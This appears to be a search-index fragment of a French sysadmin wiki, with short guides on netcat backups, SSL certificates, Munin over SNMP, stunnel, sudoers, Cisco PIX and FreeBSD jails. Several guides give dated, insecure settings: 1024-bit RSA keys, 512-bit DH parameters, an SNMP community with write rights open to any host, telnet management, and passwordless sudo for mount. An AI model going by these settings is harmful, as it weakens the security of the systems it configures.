                description: "Guide on how to use Netcat for remote partition backups, including commands for sending compressed images over the network.",
                content: "Remote Backups linkFor a simple but efficient way to perform remote backups, you can use the dd and netcat commands.\nNetcat is available in two flavors ;-):\nemerge gnu-netcat or\nemerge netcat To create an image of your entire hda1 partition, start netcat in passive (listening) mode on the remote machine:\nnetcat -l -p 10000 \u003e image.gz On your machine, run dd to read the partition, gzip to compress it, and netcat to transfer the image to the other machine:\ndd if=/dev/hda1 | gzip | netcat -w 5 remote_ip 10000 Refer to How to clone a Linux box using netcat for more information.\nResources linkNetcat: Creating a Listening Port\nNetcat: File Transfer\nNetcat Documentation\n"
            }
        );
    index.add(
            {
                id:  765 ,
                href: "\/Encrypter_sa_swap\/",
                title: "Encrypting Swap Partition",
                description: "A guide on how to encrypt your swap partition in OpenBSD systems both with and without rebooting.",
                content: "Since OpenBSD 3.7, swap is automatically encrypted. If you’re using an earlier version and wish to enable encryption, there are two solutions:\nWithout Rebooting linkTo enable swap encryption without rebooting, use the following command:\nsysctl -w vm.swapencrypt.enable=1 With Rebooting linkTo enable swap encryption permanently (requires a reboot), edit the /etc/sysctl.conf file and uncomment this line:\nvm.swapencrypt.enable=1 "
            }
        );
    index.add(
            {
                id:  766 ,
                href: "\/Testdisk_:_r%C3%A9cup%C3%A9rer_des_donn%C3%A9es_perdues\/",
                title: "TestDisk: Recovering Lost Data",
                description: "A guide on how to recover lost data using TestDisk tool",
                content: "If you need to recover lost data, here is a solution:\nTestDisk Documentation\n"
            }
        );
    index.add(
            {
                id:  767 ,
                href: "\/Compiler_avec_gcc_sur_plusieurs_architectures_(ex:_PPC_et_Intel)\/",
                title: "Compiling with GCC on Multiple Architectures (e.g., PPC and Intel)",
                description: "How to compile cross-architecture binaries using GCC, specifically for PPC and Intel architectures",
                content: "Introduction linkThis type of compilation happens in two phases. The first phase is to compile separately for Intel and PPC architectures. The second phase is to create a binary that combines both architecture binaries.\nCreating Binaries for Different Architectures linkOn Intel, I can compile with gcc like this:\ngcc -arch ppc -isysroot /Developer/SDKs/MacOSX10.4u.sdk prog.c For the Makefile, edit it and look for the following options to specify the architecture:\n-arch and -isysroot Assembly linkOnce you have your two architecture binaries, you need to merge them:\nlipo -create ppc/prog i386/prog -output prog Note: It seems that at the gcc compilation level, you can simply use the following options to avoid having to do the assembly step:\n-arch ppc -arch i386 "
            }
        );
    index.add(
            {
                id:  768 ,
                href: "\/Replication_Master_to_Slave\/",
                title: "MySQL Replication Master to Slave",
                description: "How to set up MySQL replication from master to slave configuration",
                content: "Here is documentation on how to manage MySQL Master to Slave replication.\nMySQL Master to Slave Documentation\n"
            }
        );
    index.add(
            {
                id:  769 ,
                href: "\/SSL_:_Gestion_des_certificats\/",
                title: "SSL: Certificate Management",
                description: "Guide on managing SSL certificates, including generation, renewal, and application of certificates for Courier (POP3/IMAP) servers.",
                content: "Problem Statement linkAfter a year of good and loyal service, your Courier (POP3 or IMAP) server fails due to a simple SSL problem! Yes, after a year, certificates expire!\nPreparation linkWe need to generate new certificates. First, let’s go to the right location:\ncd /etc/courier/ Then, we delete the old one:\nrm pop3d.pem Generation linkAutomatic linkIf you decide to simply renew this certificate every year, edit the “.cnf” file and fill it out correctly. Here’s an example:\nRANDFILE = /usr/lib/courier/pop3d.rand [ req ] default_bits = 1024 # Use 2056 if you're paranoid encrypt_key = yes distinguished_name = req_dn x509_extensions = cert_type prompt = no [ req_dn ] C=FR ST=France L=Paris O=Company OU=Managed by Deimos System Engineer CN=company.fr emailAddress=admin@company.fr [ cert_type ] nsCertType = server Then, run the certificate regeneration command:\n/usr/lib/courier/mkpop3dcert You should see something like this:\ngenerating a 1024 bit RSA private key ...........................++++++ .++++++ writing new private key to '/usr/lib/courier/imapd.pem' ----- 1024 semi-random bytes loaded Generating DH parameters, 512 bit long safe prime, generator 2 This is going to take a long time .....................+.........................+..........+..................... ....+...............+........+............................................+..+.. .................................+....+................................+...+.... ....................+........................................................... .+...........................+..........+........................+.............. ............+............++*++*++*++*++*++* Manual linkTo create your key manually, here’s the command that will generate the key:\nopenssl genrsa -out pop3d.pem 1024 Replace pop3.pem with imap.pem if you’re using IMAP (adapt as needed). 1024 corresponds to the number of encryption bits. Increase if necessary.\nThen, you have two options:\nSelf-signature Signature from an authority Self-signature linkThe -x509 option is used for self-signing:\nopenssl req -new -days 365 -key pop3d.pem -x509 -out pop3d.crt 365: number of days before expiration pop3d.pem: certificate to sign pop3d.crt: certificate acting as authority Signature from an authority linkHere’s an example:\nopenssl req -new -days 365 -key pop3d.pem -out pop3d.crt 365: number of days before expiration pop3d.pem: certificate to sign pop3d.crt: authoritative certificate, you should insert the certificate provided by the authority here Applying New Certificates linkTo apply these new certificates, simply restart the appropriate services. Example:\n/etc/init.d/courier-pop-ssl restart Modifying the Automatic Certificate Generation Script linkAs we saw above for automatic certificate generation, we run a script. But if we want to change the content slightly to have, for example, 2 or 3 years of grace period, it’s convenient, even if not recommended.\nLet’s edit the file /usr/lib/courier/mkpop3dcert:\ntest -x /usr/bin/openssl || exit 0 prefix=\"/usr\" if test -f /usr/lib/courier/popd.pem then echo \"/usr/lib/courier/popd.pem already exists.\" exit 1 fi umask 077 cp /dev/null /usr/lib/courier/popd.pem chmod 600 /usr/lib/courier/popd.pem chown daemon /usr/lib/courier/popd.pem cleanup() { rm -f /usr/lib/courier/popd.pem rm -f /usr/lib/courier/popd.rand exit 1 } cd /usr/lib/courier dd if=/dev/urandom of=/usr/lib/courier/popd.rand count=1 2\u003e/dev/null /usr/bin/openssl req -new -x509 -days 365 -nodes \\ -config /etc/courier/popd.cnf -out /usr/lib/courier/popd.pem -keyout /usr/lib/courier/popd.pem || cleanup /usr/bin/openssl gendh -rand /usr/lib/courier/popd.rand 512 \u003e\u003e/usr/lib/courier/popd.pem || cleanup /usr/bin/openssl x509 -subject -dates -fingerprint -noout -in /usr/lib/courier/popd.pem || cleanup rm -f /usr/lib/courier/popd.rand Now that you’ve reached this point, you should better understand which options to modify.\nResources linkCreate your own Certificate Authority\n"
            }
        );
    index.add(
            {
                id:  770 ,
                href: "\/Nfqueue_:_Filtrer_des_milliers_d\u0027adresses_IP_(ex:_par_pays)\/",
                title: "Nfqueue: Filter Thousands of IP Addresses (e.g., by Country)",
                description: "This document provides information about the NFQUEUE module for Iptables, which allows filtering thousands of IP addresses, for example by country.",
                content: "Here is documentation on the NFQUEUE module for Iptables:\nIptables filtering traffic thousands IP\n"
            }
        );
    index.add(
            {
                id:  771 ,
                href: "\/TrueCrypt:_Encryption_de_donn%C3%A9es_de_type_portables\/",
                title: "TrueCrypt: Portable Data Encryption",
                description: "Documentation about TrueCrypt for portable data encryption",
                content: "Here is documentation about TrueCrypt which allows you to encrypt portable data (e.g., USB drives, etc.):\nTrueCrypt Truly Portable Data Encryption\n"
            }
        );
    index.add(
            {
                id:  772 ,
                href: "\/Monitorer_Windows_avec_Munin\/",
                title: "Monitoring Windows with Munin",
                description: "How to set up monitoring for Windows systems using Munin through SNMP",
                content: "Introduction linkWindows and its complications… it’s so much easier on Linux! Anyway, there’s no getting around it, it’s still good when Munin runs on Windows, so here’s the documentation…\nConfiguring SNMP on Windows linkSNMP is a Windows service that can be installed as follows:\nControl Panel Add/Remove Programs Add or Remove Windows Components Management and Analysis Tools SNMP (You’ll need the Windows CD-ROM)\nThen, configure the SNMP service:\nControl Panel Administrative Tools Services SNMP Service Agent Tab linkCheck all the relevant boxes\nTraps Tab link Community name: public Trap destinations: the server(s) that collect(s) SNMP information Security Tab link Modify the Public community by setting rights to READ CREATE Check “Accept SNMP packets from any host” OK Restart the service Installing Munin on Linux Debian linkNothing complicated:\napt-get install munin libwww-perl libnet-snmp-perl Remember to open ports 4949 (tcp) as well as 161 (tcp) and 162 (tcp) for SNMP support. Do a small search for the SNMP capabilities of the machine in question:\nmunin-node-configure-snmp windows.mydomain Which should result in something like this:\nln -s /usr/share/munin/plugins/snmp__df /etc/munin/plugins/snmp_windows.mydomain_df ln -s /usr/share/munin/plugins/snmp__if_err_ /etc/munin/plugins/snmp_windows.mydomain_if_err_16777219 ln -s /usr/share/munin/plugins/snmp__if_ /etc/munin/plugins/snmp_windows.mydomain_if_16777219 ln -s /usr/share/munin/plugins/snmp__processes /etc/munin/plugins/snmp_windows.mydomain_processes ln -s /usr/share/munin/plugins/snmp__users /etc/munin/plugins/snmp_windows.mydomain_users Copy and paste these commands.\nConfiguring Munin linkAdd the following lines in /etc/munin/munin/munin.conf:\n[windows.mydomain] address 127.0.0.1 use_node_name no Note that the name in brackets must correspond to the name used for the links created previously. 127.0.0.1 is not an error because it’s the local SNMP server that manages data from remote machines.\nThen restart Munin:\n/etc/init.d/munin-node restart FAQ linkIt’s not graphing!!! linkIn these cases… only one solution (don’t forget we’re on Windows): reboot the Windows machine.\nReferences linkhttps://munin.projects.linpro.no/wiki/HowToMonitorWindows\nhttps://www.debian-administration.org/articles/380\nhttps://www.skolelinux.no/~klaus/sarge/x3579.html\n"
            }
        );
    index.add(
            {
                id:  773 ,
                href: "\/Stunnel_:_Fabrication_d\u0027un_tunnel_SSL\/",
                title: "Stunnel: Creating an SSL Tunnel",
                description: "A guide on how to set up and configure Stunnel to create secure SSL tunnels for services that don't natively support encryption.",
                content: "Introduction linkIf you have software that doesn’t support SSL, and you want to secure network connections, you can encapsulate it in an SSL tunnel. This tunnel will encrypt data from end to end.\nInstallation linkDebian link apt-get install stunnel4 Red-Hat link wget http://www.stunnel.org/download/stunnel/src/stunnel-4.20.tar.gz tar -xzvf stunnel-4.20.tar.gz cd stunnel-4.20 ./configure \u0026\u0026 make \u0026\u0026 make install Windows linkDownload the client: https://www.stunnel.org/download/binaries.html\nOn Windows, all configuration files are in “C:\\Program Files\\stunnel”, so adapt the examples below according to file paths\nConfiguration linkServeur linkDon’t modify the /etc/stunnel/stunnel.conf file; it’s preferable to create a separate file (for example “/etc/stunnel/services.conf”).\nHere’s an example of the file contents that will forward telnet and a VNC connection (assuming a VNC server is running on port “5901”).\ncert = /etc/stunnel/stunnel.pem # Certificate to use CAfile = /etc/stunnel/stunnel.pem # same verify = 3 # Certificate verification level ##Service Definitions## [Telnet] # Service Name accept = 88.191.31.151:12345 # Server address hosting the service: Secure alternative port connect = 127.0.0.1:23 # Local server address: Real service port [VNC] # Service Name accept = 88.191.31.151:54321 # Server address hosting the service: Secure alternative port connect = 127.0.0.1:5901 # Local server address: Real service port Client linkAs with the server, it’s preferable to create a separate configuration file (still “/etc/stunnel/services.conf”). This file will be similar to the server file except that the service logic is reversed and the “Client” option is defined:\nclient = yes # Indicates this is the client cert = /etc/stunnel/stunnel.pem # Certificate to use CAfile = /etc/stunnel/stunnel.pem # same verify = 3 # Certificate verification level ##Service Definitions## [Telnet] # Service Name accept = 127.0.0.1:23 # Server address hosting the service: Secure alternative port connect = 88.191.31.151:12345 # Local server address: Real service port [VNC] # Service Name accept = 127.0.0.1:5901 # Server address hosting the service: Secure alternative port connect = 88.191.31.151:54321 # Local server address: Real service port Generation du Certificat linkCreate a file “/etc/stunnel/cert.conf” with the following lines:\n[ req ] default_bits = 1024 # Set 2056 if you're paranoid encrypt_key = yes distinguished_name = req_dn x509_extensions = cert_type prompt = no [ req_dn ] C=FR ST=France L=Paris O=Deimos OU=Deimos Network Team CN=deimos.fr emailAddress=xxx@mycompany.com [ cert_type ] nsCertType = server Then, to generate the certificate, navigate to the “/etc/stunnel” directory and type:\nopenssl req -new -days 365 -nodes -config /etc/stunnel/cert.conf -out stunnel.pem -x509 -keyout stunnel.pem Utilisation linkNow that the configuration files are created, stunnel is ready to be launched.\nLinux:\nstunnel4 /etc/stunnel/services.conf Windows:\ncd \"C:\\Programe Files\\stunnel\" stunnel.exe services.conf The client can then connect to the remote service this way:\ntelnet 127.0.0.1 vnc4client 127.0.0.1:5901 "
            }
        );
    index.add(
            {
                id:  774 ,
                href: "\/Modifier_la_version_des_sources\/",
                title: "Modifying Source Version",
                description: "How to modify kernel source version to match your running kernel for compiling software",
                content: " You have recompiled your own little kernel, GREAT! Your kernel is called “2.6.21-a_bibi” You want to recompile a software that relies on the source/headers of your kernel and “BAM!” it doesn’t work: “The sources you are using do not match your kernel! You must be kidding!!!” and so on. I say NO ladies and gentlemen!\nAll you need to do is modify your sources to fool your kernel!\nHere is the content of the file version.h located in /include/linux/version.h:\n#define UTS_RELEASE \"2.6.21-a_bibi\" #define LINUX_VERSION_CODE 132628 #define KERNEL_VERSION(a,b,c) (((a) \u003c\u003c 16) + ((b) \u003c\u003c 8) + (c)) You need to modify the UTS_RELEASE line to make it match with the result of the uname -r command on your machine.\nAdditionally, you need to do the same in the utsrelease.h file located in /include/linux/version.h:\n#define UTS_RELEASE \"2.6.21-a_bibi\" And then you say wowww!\n"
            }
        );
    index.add(
            {
                id:  775 ,
                href: "\/Cr%C3%A9er_des_images_vierges_pour_tester_des_filesystems\/",
                title: "Creating Blank Images for Testing Filesystems",
                description: "How to create blank disk images to safely test filesystems without risking your existing partitions",
                content: "If, like me, you want to test a new filesystem or hardware speed without risking damage to one of your partitions, here’s a small tip that allows you to create a blank disk image to work with:\ndd if=/dev/zero of=./mon_image.img bs=1M count=128 or\ndd if=/dev/zero of=./10M.img bs=10m count=1 The second line is more for BSD systems.\nHere, I’ll have a 128 MB image. Change the last number if you want a different size.\nNow, all that’s left is to format the partition and start experimenting:\nmkfs.ext3 mon_image.img "
            }
        );
    index.add(
            {
                id:  776 ,
                href: "\/Autoriser_rapidement_un_utilisateur_%C3%A0_avoir_acc%C3%A8s_aux_commandes_cluster\/",
                title: "Quickly Grant User Access to Cluster Commands",
                description: "Learn how to quickly configure user permissions to allow non-root users to execute cluster management commands.",
                content: "Introduction linkWe often need users to have access to specific commands without being root, and for cluster management, if you have dedicated administrators, it’s quite useful. Here’s a simple way to give them the necessary permissions…\nConfiguration linkTo give a user permissions to simply use cluster commands, here are the files to modify:\n/etc/sudoers: # Cmnd alias specification Cmnd_Alias CLUSTAT = /usr/sbin/clustat Cmnd_Alias CLUSVCADM = /usr/sbin/clusvcadm Cmnd_Alias MOUNT = /bin/mount Cmnd_Alias UMOUNT = /bin/umount # Defaults specification # User privilege specification root ALL=(ALL) ALL my_user ALL=NOPASSWD:CLUSTAT,NOPASSWD:CLUSVCADM,NOPASSWD:MOUNT,NOPASSWD:UMOUNT ~/.bashrc (for the user) # User specific aliases and functions alias clustat='sudo /usr/sbin/clustat' alias clusvcadm='sudo /usr/sbin/clusvcadm' alias mount='sudo /bin/mount' alias umount='sudo /bin/umount' Usage linkWith my user account, I can simply run the commands and they will be executed as root:\n$ clustat "
            }
        );
    index.add(
            {
                id:  777 ,
                href: "\/Xterm_:_personnaliser_l\u0027affichage\/",
                title: "Xterm: Customizing the Display",
                description: "How to customize Xterm configuration and display settings for better readability",
                content: "Introduction linkWhen using any shell with a highly customized interface, launching an Xterm terminal can sometimes result in ugly and unreadable colors.\nI’d like to share my simple configuration file that I use daily.\nXdefaults linkSimply create a ~/.Xdefaults file and insert the following content:\n! Deimos Xterm file ! Put the content in ~/.Xdefaults *xterm*background: black *xterm*foreground: white *loginShell: true ! Use color for underline attribute *VT100*colorULMode: on *VT100*underLine: off ! Use color for the bold attribute *VT100*colorBDMode: on ! Love scrollback *VT100*saveLines: 5000 *VT100*scrollBar: true Now launch a graphical Xterm and the magic will happen :-)\n"
            }
        );
    index.add(
            {
                id:  778 ,
                href: "\/Dumper_les_connections_dune_interface\/",
                title: "Capturing connections on an interface",
                description: "How to capture and monitor network connections on a Cisco interface using access lists and dumps.",
                content: "Introduction linkCapturing (or dumping) means to capture network packets. In this article, we’ll look at how to capture TCP packets that pass through our Cisco device, particularly through a specific interface. Here’s how to proceed.\nCreating the access list linkFirst, create an access list called dumptcp to allow connections from a host to any of our interfaces. You can specify a particular one if you wish:\naccess-list dumptcp permit ip host 192.168.0.104 any Then we do the reverse so that the Cisco can respond:\naccess-list dumptcp permit ip any host 192.168.0.104 Creating the Dump linkNow that we have the ability to see the traffic, we need to create the dump rule that we’ll call dump104, and that we’ll use on the inside interface:\ncapture dump104 access-list dumptcp interface inside Now, we verify that our dump is correctly configured:\n$ show capture capture dump104 access-list dumptcp interface inside Now that everything is set up, we can view the capture:\n$ show capture dump104 14:25:49.653545 192.168.0.77 \u003e 192.168.0.104: icmp: echo request 14:25:50.650952 192.168.0.77 \u003e 192.168.0.104: icmp: echo request 14:25:51.650967 192.168.0.77 \u003e 192.168.0.104: icmp: echo request "
            }
        );
    index.add(
            {
                id:  779 ,
                href: "\/Installation_from_Scratch_d\u0027un_Cisco_Pix\/",
                title: "Installation from Scratch of a Cisco Pix",
                description: "A guide on how to install and configure a Cisco Pix firewall from scratch, including initial setup and telnet activation.",
                content: "Introduction linkThe installation of a Cisco device is not very complicated, but if you’re not familiar with it, it’s not always obvious. That’s why I made this small guide, since it’s not something we do every day.\nInstallation linkConnected via serial port? Let’s get started:\nPre-configure PIX Firewall now through interactive prompts [yes]? Enable password []: mot_de_passe Clock (UTC): Year [2007]: Month [May]: Day [23]: Time [02:57:33]: 12:01:00 Inside IP address: 192.168.0.77 Inside network mask: 255.255.255.0 Host name: hk-pix-bak Domain name: mon_domaine IP address of host running PIX Device Manager: 192.168.0.104 The following configuration will be used: Enable password: mot_de_passe Clock (UTC): 12:01:00 May 23 2007 Inside IP address: 192.168.0.77 Inside network mask: 255.255.255.0 Host name: hk-pix-bak Domain name: mon_domaine IP address of host running PIX Device Manager: 192.168.0.104 Use this configuration and write to flash? y To summarize:\nInside IP address: this is the address of the Cisco device IP address of host running PIX Device Manager: this is the address of the machine that will have the right to connect via HTTPS to configure the PIX Activation of Telnet linkHere, we want to enable telnet on the inside interface for the network 192.168.0.0:\ntelnet 192.168.0.0 255.255.255.0 inside Now, we can verify that it works:\n# show run | grep telnet telnet 192.168.0.0 255.255.255.0 inside telnet timeout 5 "
            }
        );
    index.add(
            {
                id:  780 ,
                href: "\/Resetter_completement_la_configuration_d\u0027un_Cisco\/",
                title: "Completely Reset a Cisco Configuration",
                description: "How to completely reset a Cisco device configuration with simple commands",
                content: "Reset a Cisco PIX Configuration linkTo completely reset the configuration of a Cisco PIX, here is the solution:\nclear config all write erase The installation can then restart:\n----------------------------------------------------------------------- || || || || |||| |||| ..:||||||:..:||||||:.. c i s c o S y s t e m s Private Internet eXchange ----------------------------------------------------------------------- Cisco PIX Firewall Cisco PIX Firewall Version 6.3(5) Licensed Features: Failover: Enabled VPN-DES: Enabled VPN-3DES-AES: Disabled Maximum Physical Interfaces: 6 Maximum Interfaces: 10 Cut-through Proxy: Enabled Guards: Enabled URL-filtering: Enabled Inside Hosts: Unlimited Throughput: Unlimited IKE peers: Unlimited This PIX has a Failover Only (FO) license. "
            }
        );
    index.add(
            {
                id:  781 ,
                href: "\/CVS_:_Utilisation_de_CVS\/",
                title: "CVS: Using CVS",
                description: "A guide to the basics of using CVS (Concurrent Versions System) for version control, including project management, adding and removing files, and identifying changes.",
                content: "Introduction linkCVS, an acronym for Concurrent Versions System, is free software (GPL license) for version management, successor to SCCS. Although it is still widely used in the open source software domain, it is now obsolete with the arrival of its successor Subversion. Since it helps sources converge towards the same destination, we say that CVS manages concurrent versions. It can function both in command line mode and through a graphical interface. It consists of client modules and one or more server modules for exchange areas.\nIt’s worth noting that there are also decentralized software options like Bazaar, Darcs, Git, or Monotone, all under Open Source licenses.\nAmong the most popular graphical interfaces, notable ones include Cervisia for Linux and TortoiseCVS for Windows.\nPrerequisites linkFor prerequisites, you need a few things in your environment. I strongly recommend adding them to your shell load file (e.g., ~/.bashrc, ~/.zshrc):\nexport CVS_RSH=/usr/bin/ssh export CVSROOT=:ext:xxx@mycompany.com:/var/lib/cvs In the first line, we need to indicate the transport method for CVS. In this case, it’s SSH. For the second, we indicate the hostname where the CVS server is located, as well as the folder where the repository is located.\nReload your shell and you’re good to go.\nUsage linkProjects link Downloading a project: cvs checkout project_name Updating a project after updates (this does not upload our updates): cvs update Creating a new project (make sure you’re in the concerned project first!): cvs import project_name creator release Destroying a project: cvs release -d project_name Adding Files link Adding files: cvs add file_name Updating files: cvs commit files_to_update Updating files with comments at the same time: cvs commit -m \"My comments\" files_to_update Removing Files linkTo remove files, you need to:\nDelete the file on your local machine: rm file_name Remove the file from cvs: cvs remove file_name Commit the changes: cvs commit file_name Identification link View differences between server modifications and your own: cvs diff "
            }
        );
    index.add(
            {
                id:  782 ,
                href: "\/OpenSSH:_Multiplexage_des_connexions_SSH\/",
                title: "OpenSSH: SSH Connection Multiplexing",
                description: "How to set up SSH connection multiplexing to accelerate login times for multiple connections to the same host.",
                content: "Since version 4.0, OpenSSH allows multiplexing several connections into one, which speeds up the connection time for subsequent logins.\nThis tip requires OpenSSH version 4.2 or higher to work.\nJust add this to your ~/.ssh/config file:\nHost * ControlMaster auto ControlPath ~/.ssh/master-%r@%h:%p All new connections to a host where you are already connected will go through this existing connection. In addition to speeding up connection time, this has the advantage of not prompting for passwords on subsequent connections.\n"
            }
        );
    index.add(
            {
                id:  783 ,
                href: "\/Xen_et_vserver_:_monitoring_des_VM_sur_une_page_PHP\/",
                title: "Xen and vserver: monitoring VMs on a PHP page",
                description: "A guide to monitoring virtual machines using a PHP page to easily view VM activity without running multiple commands.",
                content: "Introduction linkI used this kind of script because it’s simpler to open a small web page to view VM activity rather than launching a bunch of commands.\nSudo linkYou need sudo because by default Apache doesn’t have the necessary rights to execute these commands:\napt-get install sudo Then edit /etc/sudoers and add the following:\nwww-data ALL=NOPASSWD: /usr/sbin/vserver-stat,/usr/sbin/xm list Php and script linkYou obviously need to have Apache and PHP installed for this to work:\napt-get install apache2 php5 Additionally, there’s a small JavaScript that refreshes the page every 60 seconds.\nThen create a folder and copy this into an index file:\nmkdir /var/www/virtual \u0026\u0026 vi /var/www/virtual/index.php Here’s the content of index.php:\n\u003c!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\u003e Informations for Virtual Machines \u003c?php system(\"date +%c\") ; echo(\"\n--- Vservers informations ---\n\") ; echo(\"\\n\") ; system(\"sudo /usr/sbin/vserver-stat\") ; echo(\"\\n\") ; echo(\"\n\") ; echo(\"--- Xen informations ---\n\") ; echo(\"\\n\") ; system(\"sudo /usr/sbin/xm list\") ; echo(\"\") ; ?\u003e Now set the proper permissions:\nchown -Rf www-data. /var/www/virtual All that’s left is to access it :-)\n"
            }
        );
    index.add(
            {
                id:  784 ,
                href: "\/Monit_et_Munin_:_Surveiller_avec_Munin_et_%C3%AAtre_alert%C3%A9_avec_Monit\/",
                title: "Monit and Munin: Monitor with Munin and Get Alerts with Monit",
                description: "Documentation on how to set up monitoring and alerts using Munin and Monit.",
                content: "Here is documentation to be alerted in case of problems:\nMonitoring Munin Monit PDF\n"
            }
        );
    index.add(
            {
                id:  785 ,
                href: "\/G%C3%A9n%C3%A9rer_un_fichier_configure_pour_pr%C3%A9-make\/",
                title: "Generate a Configure File for Pre-make",
                description: "How to generate a configure file before running make when retrieving sources from SVN or CVS repositories.",
                content: "Introduction linkAs you probably already know, the three magic commands are:\n./configure make make install This is nice and cool, but if you’re retrieving sources from SVN or CVS repositories, you might not always have the configure file. This is why you only need two simple commands to generate one:\n/usr/bin/autoheader ; /usr/bin/autoconf "
            }
        );
    index.add(
            {
                id:  786 ,
                href: "\/Connaitre_le_page_size_de_sa_machine\/",
                title: "How to Check the Page Size of Your Machine",
                description: "Methods to determine memory page size in different operating systems for more efficient memory allocation",
                content: "Determining the Page Size linkMost operating systems allow programs to determine what the page size is so that they can allocate memory more efficiently.\nUNIX and POSIX-based Operating Systems linkUNIX and POSIX-based systems use the C function sysconf().\nEdit a test.c file and paste it:\n#include // printf(3) #include // sysconf(3) int main(void) { printf(\"The page size for this system is %ld bytes\\n\", sysconf(_SC_PAGESIZE)); //_SC_PAGE_SIZE is OK too. return 0; } Then compile it with gcc:\ngcc -o test test.c Now launch it:\n# ./test The page size for this system is 4096 bytes Win32-based Operating Systems (Windows 9x, NT, ReactOS) linkWin32-based operating system use the C function GetSystemInfo() function in kernel32.dll\n#include SYSTEM_INFO si; GetSystemInfo(\u0026si); printf(\"The page size for this system is %u bytes\\n\", si.dwPageSize); "
            }
        );
    index.add(
            {
                id:  787 ,
                href: "\/Configuration_d%27un_r%C3%A9seau_local_sur_Debian_et_Ubuntu\/",
                title: "Configuring a Local Network on Debian and Ubuntu",
                description: "A simple guide to configuring static and dynamic network interfaces on Debian and Ubuntu systems",
                content: "Introduction linkNot always easy to remember what to put in these damn files, right? Here are some simple examples.\nConfiguring Network Interfaces linkEdit the file /etc/network/interfaces.\nStatic IP Addressing linkFor example, here’s how I configure my eth0 interface:\nauto lo eth0 iface lo inet loopback # Interface eth0 iface eth0 inet static address 192.168.0.1 netmask 255.255.255.0 broadcast 192.168.0.255 network 192.168.0.0 gateway 192.168.0.138 Dynamic IP Addressing linkIf I want dynamic addressing, it’s even simpler:\nauto lo eth0 iface lo inet loopback # Interface eth0 iface eth0 inet dhcp Configuring DNS Servers linkEdit the file /etc/resolv.conf:\nsearch deimos.fr local nameserver 192.168.0.1 nameserver 192.168.0.2 nameserver 212.27.32.5 nameserver 212.27.32.6 "
            }
        );
    index.add(
            {
                id:  788 ,
                href: "\/Jailctl_:_Cr%C3%A9ation_de_chroot_%28jails%29\/",
                title: "Jailctl: Creating Chroot Environments (Jails)",
                description: "A guide on how to create, configure, and manage FreeBSD jails using Jailctl",
                content: "Introduction linkJailctl is a shell tool for creating/launching/stopping/updating/backing up/restoring/destroying jails. By jail, we mean here a “virtual server” and not simply a method for isolating a service.\nInstallation linkHere’s the command to install the package:\npkg_add -vr jailctl or\ncd /usr/ports/sysutils/jailctl ; make install clean Configuration link You need a config file: /usr/local/etc/jails.conf You also need: a directory where the jails will be stored (/data in this example) A runme.sh script provided with jailctl that lives by default in /usr/local/jails/addons/ A file dellist4.txt that contains a list of files to delete in the jails because they are not needed (for example commands like mount) A file dellist5.txt that contains more files to delete in case jailctl runs on a 5.x or a 6.x (jailctl is indeed compatible with all versions from 4.x to 6.x) And finally an etc/ directory with configuration files to install in the new jails (by default, login.conf and make.conf). All this lives in /usr/local/jails/addons/ which we will need to move to /data/addons/ in our example.\nChanges in login.conf linkIt is recommended to modify the following line:\n:setenv=PS1=[\\\\u@\\\\h] \\\\w\\\\\\\\$ ,MAIL=/var/mail/$,BLOCKSIZE=K,FTP_PASSIVE_MODE=YES, \\ PACKAGEROOT=ftp\\c//ftp.no.freebsd.org,CLICOLOR=1,EDITOR=/usr/local/bin/nano:\\ to use a closer mirror:\n:setenv=PS1=[\\\\u@\\\\h] \\\\w\\\\\\\\$ ,MAIL=/var/mail/$,BLOCKSIZE=K,FTP_PASSIVE_MODE=YES, \\ PACKAGEROOT=ftp\\c//ftp.fr.freebsd.org,CLICOLOR=1,EDITOR=/usr/local/bin/nano:\\ You can also customize the default editor and other settings if needed.\nChanges in jails.conf linkHere is the main configuration. Since the file is very well documented internally, here are just the mandatory elements to get started quickly.\nInterface on which to add the jail IPs:\nIF=\"em0\" Where the jails will be stored:\nJAIL_HOME=\"/data/\" Where the jail backups will be stored (by default in the same place):\nBACKUPDIR=$JAIL_HOME What not to back up:\nBACKUP_EXCLUDE=\"--exclude ./usr/ports/* --exclude ./tmp/* --exclude ./var/tmp/* --exclude ./usr/src/*\" The jails themselves:\nJAILS=\"\" JAILS=\"$JAILS chii.domaine.com:192.168.1.43\" JAILS=\"$JAILS motosuwa.domaine.com:192.168.1.44\" JAILS=\"$JAILS sumomo.domaine.com:192.168.1.46\" JAILS=\"$JAILS yuzuki.domaine.com:192.168.1.47:/usr/local/jails\" JAILS=\"$JAILS yoshiyuki.domaine.com:192.168.1.48:/data2/yoshi/\" JAILS=\"$JAILS example.domaine.com:192.168.1.49\" Note a special feature recently added to jailctl. You can customize the directory where a specific jail will be stored.\nUntil now, jails were always stored in $JAIL_HOME/name.of.domain.com. Now, you can either specify another general directory (if you don’t put a / at the end, for example here yuzuki will be in /usr/local/jails/yuzuki.domaine.com/) or a full directory for a given jail (if you put a / at the end, yoshiyuki will be in /data2/yoshi/).\nAn rc.conf will be placed in the jail, containing:\nRC_CONF='sendmail_enable=\"NO\" sshd_enable=\"YES\" portmap_enable=\"NO\" \\ network_interfaces=\"\" tcp_keepalive=\"NO\" inetd_enable=\"NO\"' Finally, you need to provide a DNS for the jail’s resolv.conf:\nNAMESERVER=\"195.95.225.104\" It is essential that this DNS is reachable during the “create” of the jail, as packages will be installed by runme.sh at the end of the creation.\nFinally, if desired, you can specify scripts that will be executed before/after certain jailctl commands (the scripts will receive as argument $1 the name of the jail and as $2 its jail ID as long as you’re at least on a 5.x):\nBEFORESTATUS_HOOKS=\"/usr/bin/true\" AFTERSTATUS_HOOKS=\"/usr/bin/true\" BEFORESTART_HOOKS=\"/usr/bin/true\" AFTERSTART_HOOKS=\"/usr/bin/true\" BEFORESTOP_HOOKS=\"/usr/bin/true\" AFTERSTOP_HOOKS=\"/usr/bin/true\" Advice linkWARNING: It is STRONGLY advised against creating jails with a different environment than the host machine, for example a host in -STABLE and jails in -RELEASE, or vice versa. With jailctl, this essentially means that you should not do a cvsup between compiling the host and installing the jails.\nTake the time to read jails.conf as well as runme.sh before doing anything to customize them.\nPractical Implementation linkJail status link # jailctl status Jail status (*=running, !=not configured): *chii.domaine.com (192.168.1.43) *motosuwa.domaine.com (192.168.1.44) *sumomo.domaine.com (192.168.1.46) *yuzuki.domaine.com (192.168.1.47) yoshiyuki.domaine.com (192.168.1.48) *example.domaine.com (192.168.1.49) In this example, all jails are installed and yoshiyuki is not running. A jail not yet created would be marked with an exclamation mark.\nCreating a jail link # jailctl create example.domaine.com Creating jail example.domaine.com... \u003e\u003e\u003e Making hierarchy \u003e\u003e\u003e 